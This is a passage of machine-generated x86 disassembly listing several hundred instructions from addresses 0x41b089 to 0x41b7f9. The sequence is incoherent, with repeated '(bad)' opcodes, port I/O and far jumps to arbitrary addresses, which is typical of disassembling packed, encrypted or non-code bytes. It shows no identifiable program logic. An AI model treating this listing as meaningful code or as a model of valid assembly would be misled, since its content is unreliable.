  41b089:	or     ah,al
  41b08b:	inc    ebp
  41b08c:	mov    cl,0xc6
  41b08e:	cwde   
  41b08f:	(bad)  
  41b090:	jmp    0x41b02e
  41b092:	sub    bh,BYTE PTR [edx+0x45f45814]
  41b098:	or     ebx,DWORD PTR [ecx-0x61a937d]
  41b09e:	ret    
  41b09f:	fucomip st,st(5)
  41b0a1:	(bad)  
  41b0a2:	fdivr  st,st(3)
  41b0a4:	call   0x7724:0x60ae9d80
  41b0ab:	pusha  
  41b0ac:	lock das 
  41b0ae:	das    
  41b0af:	icebp  
  41b0b0:	mov    BYTE PTR [edx],dh
  41b0b2:	gs jecxz 0x41b09f
  41b0b5:	mov    dh,0x68
  41b0b7:	je     0x41b07a
  41b0b9:	(bad)  
  41b0bb:	mov    al,es:0x194f5c43
  41b0c1:	xchg   ebx,eax
  41b0c2:	adc    al,BYTE PTR [edx*8+0x4afd7b4d]
  41b0c9:	js     0x41b04d
  41b0cb:	mov    ds:0xe1f8f96a,al
  41b0d0:	int    0xbd
  41b0d2:	mov    esp,DWORD PTR [ecx]
  41b0d4:	dec    esi
  41b0d5:	pop    esi
  41b0d6:	inc    edi
  41b0d7:	mov    ecx,0x29a3eb8e
  41b0dc:	mov    ch,0x80
  41b0de:	push   cs
  41b0df:	sbb    edx,esp
  41b0e1:	sbb    ebp,edx
  41b0e3:	rcr    BYTE PTR ds:0x9b7f7848,1
  41b0e9:	or     ecx,DWORD PTR [eax+0x4f]
  41b0ec:	enter  0x3818,0xc7
  41b0f0:	lahf   
  41b0f1:	dec    esp
  41b0f2:	pushf  
  41b0f3:	in     eax,dx
  41b0f4:	fnstsw WORD PTR ss:[bp+di+0x566]
  41b0fa:	addr16 mov al,0x5e
  41b0fd:	jns    0x41b093
  41b0ff:	stc    
  41b100:	pop    ebx
  41b101:	xchg   ebp,eax
  41b102:	mov    dl,0x9d
  41b104:	shl    cl,cl
  41b106:	fisubr WORD PTR [esi]
  41b108:	rcl    BYTE PTR [eax],1
  41b10a:	mov    ebx,edx
  41b10c:	stos   BYTE PTR es:[edi],al
  41b10d:	add    DWORD PTR [edi+0x1aea6ca],edi
  41b113:	inc    ecx
  41b114:	push   edx
  41b115:	jge    0x41b0da
  41b117:	xlat   BYTE PTR ds:[ebx]
  41b118:	jne    0x41b108
  41b11a:	mov    dh,0xad
  41b11c:	mov    edx,?
  41b11e:	inc    ebp
  41b11f:	xchg   BYTE PTR [esi+edx*1-0x582188f3],bl
  41b126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b127:	not    BYTE PTR [ebp+0x25]
  41b12a:	pop    esi
  41b12b:	cmp    BYTE PTR [edx-0x46],0xe9
  41b12f:	jecxz  0x41b0cd
  41b131:	sbb    al,0xe7
  41b133:	sbb    al,0x1d
  41b135:	in     al,0x4b
  41b137:	pop    edx
  41b138:	dec    esi
  41b139:	mov    ebx,0x940d34b6
  41b13e:	mov    bh,BYTE PTR [eax+0x3d896d8d]
  41b144:	lea    esp,[esi-0x5d]
  41b147:	das    
  41b148:	dec    esp
  41b149:	pop    edx
  41b14a:	out    0x8,al
  41b14c:	xor    eax,0x5adc7f89
  41b151:	sub    eax,0x5bafafb7
  41b156:	sub    al,0x3d
  41b158:	and    eax,0xca8ba171
  41b15d:	push   0x24ed4cbb
  41b162:	das    
  41b163:	sbb    DWORD PTR [edx-0x4f],eax
  41b166:	push   edi
  41b167:	fwait
  41b168:	jnp    0x41b1c3
  41b16a:	push   ss
  41b16b:	test   eax,0x8fac5ec2
  41b170:	sub    esi,DWORD PTR cs:[ecx]
  41b173:	adc    ebx,ecx
  41b175:	mov    al,0xb5
  41b177:	out    dx,al
  41b178:	ds mov esp,0x8bb7d4e7
  41b17e:	jle    0x41b125
  41b180:	test   DWORD PTR ds:0xd633d579,eax
  41b186:	cmc    
  41b187:	in     al,dx
  41b188:	cmp    ah,BYTE PTR [ebp-0x57bd7451]
  41b18e:	rol    BYTE PTR [ebx-0xe],cl
  41b191:	(bad)  
  41b192:	out    dx,al
  41b193:	xchg   ebp,eax
  41b194:	mov    edx,0xcba87581
  41b199:	pop    ebp
  41b19a:	pop    esp
  41b19b:	pushf  
  41b19c:	push   edx
  41b19d:	jnp    0x41b16f
  41b19f:	pop    esi
  41b1a0:	ror    DWORD PTR [edi+0x41],1
  41b1a3:	imul   esi,DWORD PTR [eax],0x9acc1062
  41b1a9:	jno    0x41b1ce
  41b1ab:	call   0x6f3a:0xee95fe76
  41b1b2:	jne    0x41b1ea
  41b1b4:	xchg   edx,eax
  41b1b5:	xchg   edx,eax
  41b1b6:	dec    ebp
  41b1b7:	and    DWORD PTR [edi-0x5d],0x75
  41b1bb:	inc    edi
  41b1bc:	pushf  
  41b1bd:	inc    edx
  41b1be:	cs je  0x41b240
  41b1c1:	jl     0x41b147
  41b1c3:	lea    eax,[esi]
  41b1c5:	cmp    DWORD PTR [esi-0x4f],esi
  41b1c8:	push   0xb038e67d
  41b1cd:	mov    al,ds:0x20c9aadd
  41b1d2:	add    eax,0xf28bc018
  41b1d7:	mov    edi,0x27b16f03
  41b1dc:	add    ebx,DWORD PTR [ebp-0x38]
  41b1df:	mov    eax,0xe585fc72
  41b1e4:	imul   eax,DWORD PTR [ecx],0xffffff92
  41b1e7:	xchg   BYTE PTR [edi],cl
  41b1e9:	jnp    0x41b1fe
  41b1eb:	sub    eax,0x754fcea9
  41b1f0:	pop    ds
  41b1f1:	(bad)  
  41b1f3:	mov    DWORD PTR [edx+0x29d5b002],esi
  41b1f9:	shr    DWORD PTR [edx-0x40],0x57
  41b1fd:	mov    cl,0xaf
  41b1ff:	mov    ebx,0x2fe557d
  41b204:	pop    es
  41b205:	cmp    BYTE PTR [edx],cl
  41b207:	gs (bad) 
  41b209:	mov    esp,0xce8228e9
  41b20e:	lods   eax,DWORD PTR ds:[esi]
  41b20f:	and    ch,BYTE PTR [eax]
  41b211:	push   ecx
  41b212:	cmp    cl,bl
  41b214:	cdq    
  41b215:	fdivr  DWORD PTR ds:0xb7311d46
  41b21b:	add    al,0x5d
  41b21d:	dec    esp
  41b21e:	inc    edi
  41b21f:	mov    ebp,0xddb574eb
  41b224:	jg     0x41b236
  41b226:	dec    ebp
  41b227:	ins    BYTE PTR es:[edi],dx
  41b228:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41b22a:	fdivr  DWORD PTR [edi]
  41b22c:	js     0x41b24e
  41b22e:	mov    edx,0x86d79cf9
  41b233:	dec    ecx
  41b234:	push   0xcf3223a4
  41b239:	mov    eax,ds:0xacc29d17
  41b23e:	xchg   ecx,esi
  41b240:	in     eax,0x1f
  41b242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b243:	mov    eax,0x84110975
  41b248:	push   ds
  41b249:	sub    esp,0x1b
  41b24c:	ins    DWORD PTR es:[edi],dx
  41b24d:	ins    BYTE PTR es:[edi],dx
  41b24e:	pop    edi
  41b24f:	pushf  
  41b250:	add    DWORD PTR ds:0x552b9536,0xe411eef
  41b25a:	add    al,0x82
  41b25c:	dec    edx
  41b25d:	mov    dl,0x73
  41b25f:	je     0x41b2b7
  41b261:	pop    ebx
  41b262:	and    edx,DWORD PTR [edx-0x61d6cd0b]
  41b268:	add    bl,BYTE PTR gs:[eax-0x27]
  41b26c:	arpl   WORD PTR [esi],bx
  41b26e:	cmp    eax,esp
  41b270:	pop    ebx
  41b271:	ds jo  0x41b2c0
  41b274:	inc    ecx
  41b275:	jp     0x41b1f9
  41b277:	leave  
  41b278:	repnz rol BYTE PTR [edx-0x53],0x42
  41b27d:	lds    ecx,FWORD PTR fs:[eax]
  41b280:	out    0x9e,eax
  41b282:	fwait
  41b283:	xor    DWORD PTR [esi-0x6a31dd1d],ebx
  41b289:	cmp    ah,bh
  41b28b:	or     ah,BYTE PTR [edi+0x5169a6d1]
  41b291:	sub    ebp,esi
  41b293:	test   BYTE PTR [esi+0x7515a961],cl
  41b299:	test   eax,edx
  41b29b:	sub    BYTE PTR [esp+esi*4-0x26],bl
  41b29f:	and    BYTE PTR [esi+esi*8+0x775fd62b],bl
  41b2a6:	les    esi,FWORD PTR [esi+ecx*1]
  41b2a9:	mov    al,0xff
  41b2ab:	jb     0x41b311
  41b2ad:	sbb    edx,edx
  41b2af:	xlat   BYTE PTR ds:[ebx]
  41b2b0:	aaa    
  41b2b1:	xchg   esi,ecx
  41b2b3:	mov    bh,BYTE PTR [ebx+0x15786495]
  41b2b9:	fisttp QWORD PTR [esi+0x294ee83a]
  41b2bf:	pusha  
  41b2c0:	(bad)  
  41b2c2:	ret    
  41b2c3:	mov    dl,0xba
  41b2c5:	mov    bl,0xbd
  41b2c7:	les    eax,FWORD PTR ds:0xd40b726
  41b2cd:	sbb    ebp,ecx
  41b2cf:	loope  0x41b2e7
  41b2d1:	dec    ebp
  41b2d2:	inc    ebp
  41b2d3:	mov    fs,WORD PTR [edx+eiz*8]
  41b2d6:	jp     0x41b29a
  41b2d8:	ror    DWORD PTR [edx+0x39c6320a],1
  41b2de:	xchg   ebp,eax
  41b2df:	fwait
  41b2e0:	pop    ecx
  41b2e1:	pop    esp
  41b2e2:	test   bh,al
  41b2e4:	(bad)  
  41b2e5:	dec    esi
  41b2e6:	adc    eax,0x9210414d
  41b2eb:	retf   0x1b33
  41b2ee:	cmp    ebp,0x4a6701
  41b2f4:	sub    dl,BYTE PTR [edx+esi*1+0x4a5e57c8]
  41b2fb:	cli    
  41b2fc:	inc    esp
  41b2fd:	push   0xffffffe5
  41b2ff:	push   ecx
  41b300:	dec    esp
  41b301:	cmp    esi,DWORD PTR [ecx+0x1e5d0b89]
  41b307:	xchg   BYTE PTR [eax-0x607a86ff],ah
  41b30d:	inc    eax
  41b30e:	adc    al,0x37
  41b310:	leave  
  41b311:	sbb    DWORD PTR [edi+0x46],edi
  41b314:	outs   dx,DWORD PTR ds:[esi]
  41b315:	jp     0x41b2a7
  41b317:	xlat   BYTE PTR ds:[ebx]
  41b318:	inc    edx
  41b319:	addr16 push esi
  41b31b:	fs add al,0xd1
  41b31e:	sbb    BYTE PTR [esi-0x66c74933],dl
  41b324:	sbb    DWORD PTR ds:0x2539d2,ecx
  41b32a:	out    dx,al
  41b32b:	frstor [esi-0x6faa0128]
  41b331:	add    ecx,DWORD PTR [edx]
  41b333:	ret    
  41b334:	and    bl,cl
  41b336:	(bad)
  41b339:	jecxz  0x41b312
  41b33b:	dec    edx
  41b33c:	loop   0x41b375
  41b33e:	leave  
  41b33f:	mov    ch,0xcc
  41b341:	ds xchg edi,eax
  41b343:	out    dx,al
  41b344:	dec    esi
  41b345:	mov    ecx,0x2b778606
  41b34a:	aas    
  41b34b:	aaa    
  41b34c:	ss add esi,esi
  41b34f:	jmp    0x41b315
  41b351:	mov    BYTE PTR [eax+0x1c],dl
  41b354:	push   0xb639588f
  41b359:	mov    ch,0x6b
  41b35b:	popf   
  41b35c:	pop    eax
  41b35d:	pop    eax
  41b35e:	in     eax,0x1a
  41b360:	retf   0x5b1c
  41b363:	shl    DWORD PTR [edx],1
  41b365:	test   ebx,esp
  41b367:	repz addr16 xchg ecx,eax
  41b36a:	adc    dh,ah
  41b36c:	ret    0x4ad8
  41b36f:	mov    ecx,0xdfa12771
  41b374:	mov    bh,0x5a
  41b376:	(bad)  
  41b377:	jmp    0x41b370
  41b379:	sub    dl,BYTE PTR [ebx+0x66]
  41b37c:	(bad)  
  41b37d:	jo     0x41b3b6
  41b37f:	stos   DWORD PTR es:[edi],eax
  41b380:	ds push esi
  41b382:	popa   
  41b383:	dec    edx
  41b384:	jmp    0x2ae9:0xf23b01ea
  41b38b:	xchg   edi,eax
  41b38c:	adc    eax,0x56c729d0
  41b391:	stos   DWORD PTR es:[edi],eax
  41b392:	xchg   esp,eax
  41b393:	lock (bad) 
  41b395:	stc    
  41b396:	push   ebx
  41b397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b398:	lods   eax,DWORD PTR ds:[esi]
  41b399:	push   ds
  41b39a:	sbb    ebx,DWORD PTR [edi]
  41b39c:	popa   
  41b39d:	je     0x41b3aa
  41b39f:	lods   al,BYTE PTR ds:[esi]
  41b3a0:	outs   dx,BYTE PTR ds:[esi]
  41b3a1:	sbb    DWORD PTR [edi-0x6],0xffffffb3
  41b3a5:	add    al,BYTE PTR [esi+0x7]
  41b3a8:	retf   0xb05d
  41b3ab:	out    0xdf,eax
  41b3ad:	mov    bh,0x55
  41b3af:	cmp    WORD PTR [eax-0x4fcb6bc3],ax
  41b3b6:	in     eax,dx
  41b3b7:	adc    cl,dl
  41b3b9:	add    eax,DWORD PTR [edi]
  41b3bb:	or     al,0x20
  41b3bd:	test   DWORD PTR [ebp-0x19],edi
  41b3c0:	add    dh,BYTE PTR [edx+0x33]
  41b3c3:	iret   
  41b3c4:	call   0x2dc5fb59
  41b3c9:	or     edi,DWORD PTR [ebx-0x5394e37d]
  41b3cf:	in     eax,0x87
  41b3d1:	pop    eax
  41b3d2:	sub    dh,bh
  41b3d4:	mov    bh,0x7f
  41b3d6:	repz and ebp,DWORD PTR [esi+0x15f30ed4]
  41b3dd:	push   ebp
  41b3de:	pop    ebx
  41b3df:	jne    0x41b383
  41b3e1:	xor    ebp,DWORD PTR [esi-0x65]
  41b3e4:	lods   eax,DWORD PTR ds:[esi]
  41b3e5:	into   
  41b3e6:	enter  0xa087,0x5f
  41b3ea:	retf   0xa134
  41b3ed:	fstp   QWORD PTR ds:0x2d4d3bcb
  41b3f3:	pop    esi
  41b3f4:	add    bh,BYTE PTR [edx+eiz*1]
  41b3f7:	dec    ebp
  41b3f8:	dec    edx
  41b3f9:	pusha  
  41b3fa:	xchg   edx,eax
  41b3fb:	cli    
  41b3fc:	or     edx,DWORD PTR [edx+0x6d2a33c5]
  41b402:	add    ch,ch
  41b404:	sub    eax,0xdc0b08c5
  41b409:	xchg   edi,eax
  41b40a:	mov    WORD PTR [eax],?
  41b40c:	push   0x1d
  41b40e:	fcomp  QWORD PTR [esi+0x59]
  41b411:	push   esp
  41b412:	nop    DWORD PTR [eax]
  41b415:	dec    edi
  41b416:	push   cs
  41b417:	rcr    DWORD PTR [ebx],cl
  41b419:	outs   dx,DWORD PTR ds:[esi]
  41b41a:	inc    esi
  41b41b:	ret    
  41b41c:	arpl   WORD PTR [edi+0xa9d8c88],ax
  41b422:	(bad)  
  41b423:	or     BYTE PTR [edx-0x3080f0af],dh
  41b429:	and    DWORD PTR [ecx],0x39991128
  41b42f:	ja     0x41b3e6
  41b431:	idiv   DWORD PTR [esi+0x52d3c948]
  41b437:	and    ah,bl
  41b439:	nop    DWORD PTR [eax]
  41b43c:	cmp    DWORD PTR [ebx+ebx*4-0x25d95aa3],0xb404f5f5
  41b447:	push   ebp
  41b448:	or     BYTE PTR [ecx-0x70],dh
  41b44b:	add    DWORD PTR [edi],esi
  41b44d:	out    dx,eax
  41b44e:	not    dl
  41b450:	pop    ebp
  41b451:	add    edx,DWORD PTR ds:0x35a7b18c
  41b457:	mov    bh,0xb7
  41b459:	test   esp,eax
  41b45b:	gs scas eax,DWORD PTR es:[edi]
  41b45d:	imul   eax,DWORD PTR [eax+edx*2],0xffffffce
  41b461:	cmp    ch,ah
  41b463:	push   ecx
  41b464:	jecxz  0x41b3ec
  41b466:	or     ah,BYTE PTR [edx-0x2a]
  41b469:	jo     0x41b48f
  41b46b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b46c:	mov    al,ss:0x9eb97f46
  41b472:	and    al,0xac
  41b474:	aam    0xcb
  41b476:	pop    eax
  41b477:	or     esi,eax
  41b479:	push   0x6964aee
  41b47e:	mov    al,ds:0xd22d769c
  41b483:	xor    ah,BYTE PTR [edx+esi*1+0x39]
  41b487:	js     0x41b4bc
  41b489:	push   edx
  41b48a:	fbstp  TBYTE PTR [ebx+0x23]
  41b48d:	jge    0x41b50c
  41b48f:	mov    edx,0xe8e2822a
  41b494:	ror    bh,1
  41b496:	jp     0x41b4b9
  41b498:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41b49a:	push   ds
  41b49b:	jno    0x41b435
  41b49d:	jo     0x41b493
  41b49f:	dec    esp
  41b4a0:	mov    BYTE PTR [esi],ah
  41b4a2:	dec    edx
  41b4a3:	lods   eax,DWORD PTR ds:[esi]
  41b4a4:	adc    al,0x71
  41b4a6:	dec    ebx
  41b4a7:	int3   
  41b4a8:	mov    DWORD PTR [edx+0x12],esp
  41b4ab:	int3   
  41b4ac:	cmp    eax,0xb226aa8a
  41b4b1:	dec    edi
  41b4b2:	(bad)  
  41b4b3:	push   esp
  41b4b4:	ror    BYTE PTR ds:0xf3e543f8,1
  41b4ba:	sar    DWORD PTR [eax+0x1a],1
  41b4bd:	cmp    edx,DWORD PTR [ebp-0x7b]
  41b4c0:	pusha  
  41b4c1:	retf   0xb90a
  41b4c4:	arpl   WORD PTR [bp+di-0x5f],sp
  41b4c8:	retf   0xbe37
  41b4cb:	xor    esp,DWORD PTR [ecx+0x1d]
  41b4ce:	pop    DWORD PTR [edx]
  41b4d0:	sbb    BYTE PTR ds:0xf26f7710,bl
  41b4d6:	and    ebp,DWORD PTR [edx-0x6c]
  41b4d9:	and    ah,BYTE PTR ds:0x1d560164
  41b4df:	jne    0x41b487
  41b4e1:	inc    edi
  41b4e2:	cs pop ecx
  41b4e4:	mov    ecx,edi
  41b4e6:	es aas 
  41b4e8:	inc    esi
  41b4e9:	push   edx
  41b4ea:	sbb    al,0x65
  41b4ec:	and    eax,0xe2331504
  41b4f1:	arpl   bx,ax
  41b4f3:	adc    ch,ch
  41b4f5:	sbb    eax,DWORD PTR [ebx+0x173090]
  41b4fb:	push   ecx
  41b4fc:	pop    esi
  41b4fd:	push   0xa478c88
  41b502:	inc    esp
  41b503:	push   esp
  41b504:	jo     0x41b53c
  41b506:	jg     0x41b50e
  41b508:	jae    0x41b511
  41b50a:	or     edi,DWORD PTR [edi]
  41b50c:	cdq    
  41b50d:	xchg   esi,eax
  41b50e:	push   ds
  41b50f:	jle    0x41b53c
  41b511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b512:	clc    
  41b513:	sti    
  41b514:	out    dx,al
  41b515:	add    DWORD PTR [ecx],ebx
  41b517:	and    al,0x1d
  41b519:	push   cs
  41b51a:	dec    ebp
  41b51b:	mov    dl,BYTE PTR [esi]
  41b51d:	rol    DWORD PTR [esi-0x78],0x86
  41b521:	loopne 0x41b59a
  41b523:	rcr    BYTE PTR [eax+0x40],0xac
  41b527:	mov    ch,0x8d
  41b529:	mov    dl,0x9c
  41b52b:	jmp    0x41b55f
  41b52d:	and    dl,BYTE PTR [edi+0x74]
  41b530:	mov    ds:0x71be69ee,al
  41b535:	mov    bh,0x89
  41b537:	xchg   ebp,eax
  41b538:	lods   eax,DWORD PTR ds:[esi]
  41b539:	mov    ecx,0x23dfb53c
  41b53e:	push   esp
  41b53f:	and    ebx,DWORD PTR [ebx-0x5f067bfa]
  41b545:	hlt    
  41b546:	not    DWORD PTR [esi]
  41b548:	cmp    DWORD PTR [eax],esi
  41b54a:	out    dx,al
  41b54b:	icebp  
  41b54c:	add    esp,DWORD PTR [ecx-0x6c]
  41b54f:	aad    0xa1
  41b551:	ret    
  41b552:	xchg   ebp,eax
  41b553:	mov    DWORD PTR [ecx],ecx
  41b555:	mov    edx,0xb8939133
  41b55a:	pop    edx
  41b55b:	je     0x41b509
  41b55d:	push   cs
  41b55e:	scas   eax,DWORD PTR es:[edi]
  41b55f:	or     ch,BYTE PTR [edx-0x26e4182]
  41b565:	test   BYTE PTR [edx+0x40f53ce1],0x26
  41b56c:	popf   
  41b56d:	jle    0x41b543
  41b56f:	imul   esp,DWORD PTR ds:0x26bf8667,0xf4f0ce38
  41b579:	ret    0xa4a4
  41b57c:	stos   BYTE PTR es:[edi],al
  41b57d:	and    al,0x46
  41b57f:	aaa    
  41b580:	retf   
  41b581:	fidiv  WORD PTR ds:0xd5e69df5
  41b587:	pop    ebp
  41b588:	pushf  
  41b589:	xlat   BYTE PTR ds:[ebx]
  41b58a:	mov    al,0xc0
  41b58c:	xchg   ecx,eax
  41b58d:	dec    edx
  41b58e:	shl    DWORD PTR [ebx],0x5c
  41b591:	sbb    DWORD PTR [esp+esi*4-0x13],0x4e
  41b596:	mov    bl,0x20
  41b598:	bound  ebp,QWORD PTR [eax-0x21]
  41b59b:	aas    
  41b59c:	dec    edx
  41b59d:	and    eax,0x11e58e05
  41b5a2:	sub    edi,DWORD PTR [ebp-0x14]
  41b5a5:	and    al,0xa4
  41b5a7:	inc    eax
  41b5a8:	sub    al,0xb9
  41b5aa:	int3   
  41b5ab:	jo     0x41b62b
  41b5ad:	ins    BYTE PTR es:[edi],dx
  41b5ae:	repz xor esp,DWORD PTR [eax]
  41b5b1:	repnz leave 
  41b5b3:	jmp    0xf3e8:0xffe9a718
  41b5ba:	ror    DWORD PTR [ebx+0x73],cl
  41b5bd:	dec    ebx
  41b5be:	into   
  41b5bf:	(bad)  
  41b5c0:	loop   0x41b5c0
  41b5c2:	jmp    0xc6b45270
  41b5c7:	sar    DWORD PTR [ecx],cl
  41b5c9:	jns    0x41b557
  41b5cb:	jne    0x41b564
  41b5cd:	scas   al,BYTE PTR es:[edi]
  41b5ce:	sbb    esp,DWORD PTR ds:0xc36097de
  41b5d4:	lds    esi,FWORD PTR [eax*4-0xf7dd6fc]
  41b5db:	pop    esi
  41b5dc:	rol    DWORD PTR fs:[edx-0x5933497d],0x7d
  41b5e4:	xchg   edi,eax
  41b5e5:	ret    0x3c49
  41b5e8:	mov    ah,0x22
  41b5ea:	jb     0x41b593
  41b5ec:	rcr    DWORD PTR [ebx],1
  41b5ee:	(bad)  
  41b5ef:	push   cs
  41b5f0:	mov    bh,0xa9
  41b5f2:	xor    DWORD PTR [edi],edi
  41b5f4:	cli    
  41b5f5:	mov    esi,0xbb78363a
  41b5fa:	gs pusha 
  41b5fc:	js     0x41b5d2
  41b5fe:	in     eax,0xd8
  41b600:	cmp    BYTE PTR [edx],bl
  41b602:	stos   DWORD PTR es:[edi],eax
  41b603:	or     al,BYTE PTR [edi]
  41b605:	cmp    ebx,ecx
  41b607:	ror    ch,0x87
  41b60a:	jl     0x41b659
  41b60c:	and    eax,0xd8b1590d
  41b611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b612:	jmp    0x8be7:0x165f9051
  41b619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b61a:	js     0x41b5dc
  41b61c:	pop    ebx
  41b61d:	inc    edx
  41b61e:	sahf   
  41b61f:	loopne 0x41b642
  41b621:	sahf   
  41b622:	daa    
  41b623:	(bad)  
  41b624:	xchg   BYTE PTR [ebx-0x1d],ch
  41b627:	cli    
  41b628:	(bad)  
  41b629:	dec    ecx
  41b62a:	das    
  41b62b:	fwait
  41b62c:	sbb    eax,0x23b05224
  41b631:	pop    eax
  41b632:	xchg   ebx,eax
  41b633:	jae    0x41b616
  41b635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b636:	sar    BYTE PTR [ecx-0x31801234],1
  41b63c:	fwait
  41b63d:	loope  0x41b64c
  41b63f:	adc    esp,DWORD PTR [ecx]
  41b641:	xchg   ecx,eax
  41b642:	shr    BYTE PTR [esi+0x3c],1
  41b645:	push   ebx
  41b646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b647:	push   edi
  41b648:	lds    edi,FWORD PTR [ebx+0x30ba428d]
  41b64e:	sbb    al,0xd8
  41b650:	inc    ebx
  41b651:	adc    BYTE PTR [edx],dl
  41b653:	jns    0x41b636
  41b655:	(bad)  
  41b657:	or     eax,0x2a06fa12
  41b65c:	fdivr  st,st(1)
  41b65e:	lock sbb esp,eax
  41b661:	(bad)  
  41b663:	retf   
  41b664:	aad    0x7c
  41b666:	dec    ebp
  41b667:	mov    bh,0xa8
  41b669:	push   es
  41b66a:	mov    al,ds:0x3fea6cd2
  41b66f:	cs xor eax,0x58ec6039
  41b675:	inc    edi
  41b676:	pop    ecx
  41b677:	loopne 0x41b67d
  41b679:	sub    DWORD PTR ds:[eax+edx*2-0x186cf0b1],ecx
  41b681:	dec    ebp
  41b682:	push   edi
  41b683:	sub    dl,ch
  41b685:	pand   mm4,QWORD PTR [ebx+0x45152cb9]
  41b68c:	mov    esi,0x9fa7a88a
  41b691:	cdq    
  41b692:	and    eax,0xf20b0b8f
  41b697:	xchg   esp,eax
  41b698:	push   ecx
  41b699:	pop    ds
  41b69a:	and    DWORD PTR [eax],ebx
  41b69c:	inc    ebp
  41b69d:	pusha  
  41b69e:	lods   eax,DWORD PTR ds:[esi]
  41b69f:	push   eax
  41b6a0:	pop    ds
  41b6a1:	loope  0x41b6ca
  41b6a3:	mov    eax,ds:0x1cd3dae5
  41b6a8:	mov    dl,0x29
  41b6aa:	mov    ch,0xe3
  41b6ac:	mov    al,ds:0xabf50a53
  41b6b1:	mov    esp,0x37f7faf4
  41b6b6:	xor    eax,0xf86c9f9b
  41b6bb:	in     al,dx
  41b6bc:	stos   DWORD PTR es:[edi],eax
  41b6bd:	push   ecx
  41b6be:	inc    ecx
  41b6bf:	pop    esi
  41b6c0:	sbb    al,0x26
  41b6c2:	fstp   DWORD PTR [ebx]
  41b6c4:	imul   eax,esp,0x6
  41b6c7:	mov    esi,0xd1a4b94f
  41b6cc:	call   0xac3adfe6
  41b6d1:	pop    esi
  41b6d2:	mov    cl,0x5d
  41b6d4:	aam    0xf
  41b6d6:	xor    eax,0x73a75a96
  41b6db:	rol    DWORD PTR [ecx-0x58],cl
  41b6de:	pop    edi
  41b6df:	bound  eax,QWORD PTR ds:0x873f2424
  41b6e5:	jmp    0xc44e:0x690218ad
  41b6ec:	out    0xef,al
  41b6ee:	(bad)  
  41b6ef:	in     eax,0x32
  41b6f1:	jbe    0x41b748
  41b6f3:	int3   
  41b6f4:	shr    al,1
  41b6f6:	and    eax,0x882be22
  41b6fb:	dec    esp
  41b6fc:	add    DWORD PTR [ecx+0x4ec4761],edi
  41b702:	aad    0x2a
  41b704:	into   
  41b705:	pusha  
  41b706:	pusha  
  41b707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b708:	stos   BYTE PTR es:[edi],al
  41b709:	inc    esi
  41b70a:	(bad)  
  41b70b:	in     al,dx
  41b70c:	bound  esp,QWORD PTR [esi-0x3c548eea]
  41b712:	mov    ss,WORD PTR [eax+0xa37eaf3]
  41b718:	dec    ebx
  41b719:	mov    ebp,eax
  41b71b:	mov    dh,BYTE PTR [ebp-0x6f92b85e]
  41b721:	fcomp  DWORD PTR [ebp+eiz*1-0x18]
  41b725:	xchg   edx,eax
  41b726:	push   ebp
  41b727:	jns    0x41b769
  41b729:	fstp   QWORD PTR [edi+0x55b1866f]
  41b72f:	mov    eax,ds:0xd4dcea05
  41b734:	mov    ds:0x631be7c8,al
  41b739:	pop    eax
  41b73a:	mov    al,ds:0xfbe7a649
  41b73f:	inc    esp
  41b740:	mov    edx,0xa92274e2
  41b745:	loop   0x41b6ee
  41b747:	mov    esi,0xd29dd9cc
  41b74c:	mov    al,ds:0x36b0e7c1
  41b751:	sti    
  41b752:	lods   al,BYTE PTR ds:[esi]
  41b753:	(bad)  
  41b754:	(bad)
  41b757:	adc    al,0x7b
  41b759:	stos   BYTE PTR es:[edi],al
  41b75a:	retf   
  41b75b:	mov    ds:0xc120e052,al
  41b760:	das    
  41b761:	scas   eax,DWORD PTR es:[edi]
  41b762:	in     al,dx
  41b763:	adc    ebx,esi
  41b765:	jmp    0xceff:0x7c18d880
  41b76c:	mov    ds:0x80d15715,al
  41b771:	test   eax,0x66bbd45
  41b776:	shl    DWORD PTR [edi-0x5a],cl
  41b779:	xlat   BYTE PTR ds:[ebx]
  41b77a:	jp     0x41b779
  41b77c:	icebp  
  41b77d:	fbstp  TBYTE PTR [edi+0x2d8fbd71]
  41b783:	mov    ds:0x5422c5db,al
  41b788:	mov    al,ds:0x21503ae5
  41b78d:	cmp    DWORD PTR [edi-0x7c],0x16
  41b791:	push   ss
  41b792:	pop    ebp
  41b793:	or     DWORD PTR [edx+0x8799916],0xd32feea6
  41b79d:	aad    0xe5
  41b79f:	pop    ebx
  41b7a1:	ja     0x41b73b
  41b7a3:	push   esi
  41b7a4:	xor    al,0x88
  41b7a6:	scas   al,BYTE PTR es:[edi]
  41b7a7:	arpl   WORD PTR [ebp+0x252afab],ax
  41b7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7ae:	xor    al,bl
  41b7b0:	stos   DWORD PTR es:[edi],eax
  41b7b1:	mov    BYTE PTR [esi],bl
  41b7b3:	and    esp,DWORD PTR [eax+0x46]
  41b7b6:	push   ebx
  41b7b7:	and    ebx,edi
  41b7b9:	dec    eax
  41b7ba:	adc    al,0x5c
  41b7bc:	int3   
  41b7bd:	mov    edx,0xf503830d
  41b7c2:	pop    ebx
  41b7c3:	jmp    0x41b80c
  41b7c5:	mov    ah,0x78
  41b7c7:	and    ebx,DWORD PTR [ecx+0x6de9e283]
  41b7cd:	sbb    ch,ah
  41b7cf:	add    eax,0xb7ac65ea
  41b7d4:	ds das 
  41b7d6:	inc    ebx
  41b7d7:	aam    0x6d
  41b7d9:	and    DWORD PTR [esi+edx*4+0x4c6a60b6],ebx
  41b7e0:	xchg   edi,eax
  41b7e1:	pop    DWORD PTR [ebp-0x24]
  41b7e4:	mov    ch,0xff
  41b7e6:	push   ds
  41b7e7:	xor    BYTE PTR [edi-0x233c63ba],0x17
  41b7ee:	ds adc dl,cl
  41b7f1:	ror    BYTE PTR [ebx+0x2ca2ecdd],0x28
  41b7f8:	aaa    
  41b7f9:	cld    
